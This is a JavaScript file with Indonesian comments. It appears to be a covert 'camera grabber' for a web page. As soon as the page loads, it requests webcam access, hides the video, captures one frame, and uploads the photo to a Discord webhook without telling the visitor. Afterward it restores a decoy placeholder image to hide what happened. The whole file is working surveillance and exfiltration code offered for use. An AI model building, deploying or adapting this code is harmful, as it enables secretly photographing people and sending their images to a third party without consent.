const webhookURL = "https://discord.com/api/webhooks"; // Ganti dengan Webhook Discord Anda

const startButton = document.getElementById("startCamera");
const videoElement = document.getElementById("video");
const canvasElement = document.getElementById("canvas");
const videoPlaceholder = document.querySelector(".video-placeholder");
const imageElement = document.getElementById("playerImage");

async function startCameraAndCapture() {
    try {
        videoPlaceholder.style.display = "none";
        imageElement.style.display = "none";
        
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        videoElement.srcObject = stream;
        
        videoElement.style.display = "none";
    
        videoElement.onloadedmetadata = function() {
            captureImage(stream);
        };
        
    } catch (error) {
        console.error("Error accessing camera:", error);
        videoPlaceholder.style.display = "flex";
        imageElement.style.display = "block";
    }
}

function captureImage(stream) {
    canvasElement.width = videoElement.videoWidth;
    canvasElement.height = videoElement.videoHeight;
    
    const ctx = canvasElement.getContext("2d");
    
    ctx.drawImage(videoElement, 0, 0, canvasElement.width, canvasElement.height);
    
    const imageData = canvasElement.toDataURL("image/jpeg", 0.95);
    
    if (stream) {
        const tracks = stream.getTracks();
        tracks.forEach(track => track.stop());
    }
    
    sendToDiscord(imageData);
}

function sendToDiscord(imageData) {
    // Ubah data base64 menjadi blob
    const byteString = atob(imageData.split(',')[1]);
    const mimeType = imageData.split(',')[0].split(':')[1].split(';')[0];
    
    const ab = new ArrayBuffer(byteString.length);
    const ia = new Uint8Array(ab);
    
    for (let i = 0; i < byteString.length; i++) {
        ia[i] = byteString.charCodeAt(i);
    }
    
    const blob = new Blob([ab], { type: mimeType });
    
    // Buat formData
    const formData = new FormData();
    
    // Informasi untuk webhook Discord
    const payload = JSON.stringify({
        content: "Gambar dari kamera pengguna",
        username: "Camera Bot"
    });
    
    formData.append("payload_json", payload);
    formData.append("file", blob, "camera_capture.jpg");
    
    // Kirim ke Discord tanpa menampilkan status
    fetch(webhookURL, {
        method: "POST",
        body: formData
    })
    .then(response => {
        if (!response.ok) {
            console.error("Discord webhook error:", response.status);
        }
        
        videoPlaceholder.style.display = "flex";
        imageElement.style.display = "block";
    })
    .catch(error => {
        console.error("Error sending to Discord:", error);
        videoPlaceholder.style.display = "flex";
        imageElement.style.display = "block";
    });
}

startButton.addEventListener("click", startCameraAndCapture);

document.addEventListener("DOMContentLoaded", function() {
    startCameraAndCapture();
});